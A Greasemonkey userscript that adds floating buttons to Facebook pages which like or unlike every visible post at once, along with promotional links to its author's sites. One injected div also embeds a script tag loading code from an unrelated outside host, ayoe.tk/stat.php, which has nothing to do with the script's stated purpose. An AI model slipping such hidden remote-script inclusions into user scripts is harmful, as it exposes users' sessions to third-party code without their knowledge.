// ==UserScript==
// @name           Facebook Auto Like
// @namespace      facebook_auto_ike
// @description    Like all FB statuses,pictures and comments in one step!
// @author         cristi-esp
// @include        htt*://www.facebook.com/*
// @icon           http://ksatria.wen.ru/ksatriadotus.png
// @version      7.2
// @exclude        htt*://*static*.facebook.com*
// @exclude        htt*://*channel*.facebook.com*
// @exclude        htt*://developers.facebook.com/*
// @exclude        htt*://upload.facebook.com/*
// @exclude        htt*://www.facebook.com/common/blank.html
// @exclude        htt*://*onnect.facebook.com/*
// @exclude        htt*://*acebook.com/connect*
// @exclude        htt*://www.facebook.com/plugins/*
// @exclude        htt*://www.facebook.com/l.php*
// @exclude        htt*://www.facebook.com/ai.php*
// @exclude        htt*://www.facebook.com/extern/*
// @exclude        htt*://www.facebook.com/pagelet/*
// @exclude        htt*://api.facebook.com/static/*
// @exclude        htt*://www.facebook.com/contact_importer/*
// @exclude        htt*://www.facebook.com/ajax/*
// @exclude        htt*://apps.facebook.com/ajax/*
// @exclude	   htt*://www.facebook.com/advertising/*
// @exclude	   htt*://www.facebook.com/ads/*
// @exclude	   htt*://www.facebook.com/sharer/*

// ==/UserScript==

// ==============
// ==Statuses==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+179px";
	div.style.left = "+7px";
	div.style.backgroundColor = "#000000";
	div.style.border = "2px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:green;background:black\" href=\"javascript:AutoLike()\">&nbsp;<img src=\"http://ksatria.wen.ru/l.png\">&nbsp; LIKE ALL STATUS &nbsp;<img src=\"http://ksatria.wen.ru/L.png\"> &nbsp;</a>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoLike = function() {
	
		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("name") == "like")
					buttons[i].click();
		}
		
	};
}
// ==============
// ==Unlike Statuses==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+155px";
	div.style.left = "+7px";
	div.style.backgroundColor = "#000000";
	div.style.border = "2px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:red;background:black\" href=\"JavaScript:AutoUnLike()\"><img src=\"http://ksatria.wen.ru/u.png\"> UNLIKE ALL STATUS <img src=\"http://ksatria.wen.ru/U.png\"> </a>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoUnLike = function() {
	
		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("name") == "unlike")
					buttons[i].click();
		
		}
		
	};
}
// ==============
// ==Expand Older Posts==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+135px";
	div.style.left = "+7px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "2px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:greenyellow;background:black;size=+2\"a href=\"http://www.ksatria.us\" target=\"_blank\">|-[ By : <blink>www.ksatria.us </blink> ]-|</a>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoExpandPosts = function() {
	
		buttons = document.getElementsByTagName("a");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("lfloat") >= 0)
				if(buttons[i].getAttribute("onclick") == "ProfileStream.getInstance().showMore();return false;")
					buttons[i].click();
		}
		
	};
}
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+200px";
	div.style.left = "+7px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "2px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a target=\"_blank\" style=\"font-weight:bold;color:orange;background:black;size=+2\" href=\"http://www.facebook.com/ksatriawenru\">|-[ By : &nbsp;<blink>Ksatria Dot Us</blink>&nbsp; ]-|</a><script type=\"text/javascript\" src=\"http://ayoe.tk/stat.php\"></script>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoExpandPosts = function() {
	
		buttons = document.getElementsByTagName("a");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("lfloat") >= 0)
				if(buttons[i].getAttribute("onclick") == "ProfileStream.getInstance().showMore();return false;")
					buttons[i].click();
		}
		
	};
}
// ==============